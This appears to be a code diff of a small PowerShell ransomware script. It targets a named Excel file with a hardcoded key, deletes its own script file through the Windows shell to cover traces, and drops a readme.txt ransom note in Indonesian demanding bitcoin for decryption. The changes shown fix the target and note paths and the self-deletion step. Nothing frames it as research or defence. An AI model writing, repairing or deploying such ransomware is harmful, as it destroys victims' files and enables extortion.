@@ -1,9 +1,11 @@
-$target = "Y:\Documents\Pembekalan LKS.xlsx"
+$target = "Y:\Users\pyrg\Documents\Pembekalan LKS.xlsx"
 $key = "Di_antara_Kita_9861gvds1"
 
-if (Test-Path "rintaro.ps1") { 
+$rintaroPath = Join-Path (Get-Location) "rintaro.ps1"
+if (Test-Path $rintaroPath) { 
     $shell = New-Object -ComObject Shell.Application
-    $item = $shell.Namespace(0).ParseName("rintaro.ps1")
+    $folder = $shell.Namespace((Split-Path $rintaroPath))
+    $item = $folder.ParseName((Split-Path $rintaroPath -Leaf))
     $item.InvokeVerb("delete")
 }
 
@@ -52,7 +54,7 @@ if (Test-Path $target) {
         
         @"
 HEHEH KAMU BAYAR 1M BTC BARU KU DECRIPT
-"@ | Out-File "E:\myyyykiisaahhhhh\readme.txt"
+"@ | Out-File "Y:\Users\pyrg\Dekstop\readme.txt"
         
     } catch {
         Write-Host "Error: $_"
